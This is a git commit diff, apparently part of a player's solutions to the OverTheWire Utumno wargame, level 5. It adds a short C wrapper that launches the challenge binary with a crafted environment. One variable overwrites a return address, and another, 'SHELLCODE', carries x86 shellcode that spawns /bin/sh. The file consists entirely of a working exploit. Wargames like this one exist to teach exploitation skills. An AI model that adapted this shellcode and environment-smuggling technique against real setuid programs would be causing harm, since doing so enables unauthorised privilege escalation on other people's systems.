85a42bdcb2d1c71f2a4a98b368353530d722559f
Taldgan <bananaphone993@live.com>
2021-05-31 16:40:24 -0500

    u5 finished, u2 typo fix

---
+++ utumno/utumno5/u5wrapper.c
@@ -0,0 +1,7 @@
+#include <unistd.h>
+
+int main(void) {
+	char *environment[19] = {"AAAA", "BBBB", "CCCC", "DDDD", "EEEE", "FFFF", "GGGG", "HHHH", "IIII", "AAAAAAAAAAAAAAAA\xb6\xdf\xff\xff", "KKKK", "LLLL", "MMMM", "NNNN", "OOOO", "PPPP", "WANTTOUSETHIS", "SHELLCODE=\x50\xd4\xff\xff\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};
+	char *argv[1] = {0};
+	execve("/utumno/utumno5", argv, environment);
+}
